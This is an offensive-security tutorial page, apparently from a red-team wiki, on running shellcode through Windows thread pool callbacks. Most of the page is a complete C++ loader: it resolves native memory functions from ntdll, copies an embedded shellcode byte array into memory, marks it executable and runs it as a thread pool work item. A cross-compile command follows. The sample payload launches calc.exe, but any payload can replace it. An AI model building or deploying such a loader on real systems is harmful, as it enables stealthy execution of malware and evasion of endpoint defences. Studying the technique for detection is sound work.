# Thread Pool Callback Shellcode Execution

## Theory

Thread Pool API is a mechanism in Windows that allows efficient management of multiple worker threads, enabling asynchronous execution of tasks. The API provides functions such as `CreateThreadpoolWork`, `SubmitThreadpoolWork`, and `WaitForThreadpoolWorkCallbacks` to create and execute work items in a thread pool. Attackers can exploit this functionality to execute shellcode in a stealthy manner by leveraging the thread pool callback mechanism.

#### Key Concepts:

* **Thread Pool**: A collection of worker threads managed by the Windows kernel, allowing efficient execution of asynchronous tasks.
* **Thread Pool Work Item**: A task submitted to the thread pool for execution.
* **Callback Function**: A function executed by a worker thread in response to a work item submission.
* **Execution Flow Hijacking**: By injecting shellcode into memory and registering it as a thread pool callback, an attacker can execute arbitrary code within the context of a legitimate process.

#### Execution Flow

1. **Shellcode Preparation & Memory Setup**:
   * The shellcode is embedded within the executable and stored as a byte array.
   * Memory is allocated in the current process using `NtAllocateVirtualMemory` with `PAGE_READWRITE` permissions.
   * The shellcode is copied to the allocated memory using `NtWriteVirtualMemory`.
   * The memory region containing the shellcode is then marked as `PAGE_EXECUTE_READ` using `NtProtectVirtualMemory`.
2. **Thread Pool Work Item Creation**:
   * `CreateThreadpoolWork` is called with the shellcode address as the callback function.
3. **Submitting the Work Item**:
   * `SubmitThreadpoolWork` enqueues the work item for execution.
4. **Execution**:
   * A worker thread from the pool picks up the work item and executes the shellcode.
5. **Cleanup**:
   * The work item is closed using `CloseThreadpoolWork` to clean-up

## Practice

{% tabs %}
{% tab title="C++" %}
The following code implements this technique:

{% code title="PoolCallback.cpp" %}
```cpp
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>

// Add these typedefs and function declarations for the NT functions
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Define NTSTATUS if not already defined
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
 
    // calc.exe shellcode
    unsigned char decoded[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00};
    SIZE_T length = sizeof(decoded);


    // Load NT functions dynamically
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll" << std::endl;
        return 1;
    }
    
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    
    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory) {
        std::cerr << "Failed to get addresses of NT functions" << std::endl;
        return 1;
    }

    //####SYSCALL####
    HANDLE hProc = GetCurrentProcess();
    PVOID base_addr = NULL;
    SIZE_T pnew = length;
    SIZE_T bytesWritten = 0;
    DWORD oldProtect = 0;
    NTSTATUS status;

    // Allocate memory for shellcode
    status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    // Write shellcode to allocated memory
    status = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);
    if (status != 0) {
        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    // Change memory protection to executable
    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&pnew, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    std::cout << "Executing shellcode using Thread Pool API..." << std::endl;

    // Create thread pool work item with shellcode as callback
    PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)base_addr, NULL, NULL);
    if (!work) {
        std::cerr << "CreateThreadpoolWork failed with error: " << GetLastError() << std::endl;
    }

    // Submit work item to thread pool
    SubmitThreadpoolWork(work);

    // Wait for work to complete
    WaitForThreadpoolWorkCallbacks(work, FALSE);
    CloseThreadpoolWork(work);
    
    std::cout << "Execution completed" << std::endl;
    return 0;
}

int main()
{

    esc_main(NULL);
    return 0;
}
```
{% endcode %}

We can compile it from linux using following command

```bash
x86_64-w64-mingw32-g++ PoolCallback.cpp -o PoolCallback.exe -std=c++20 -static
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait" %}
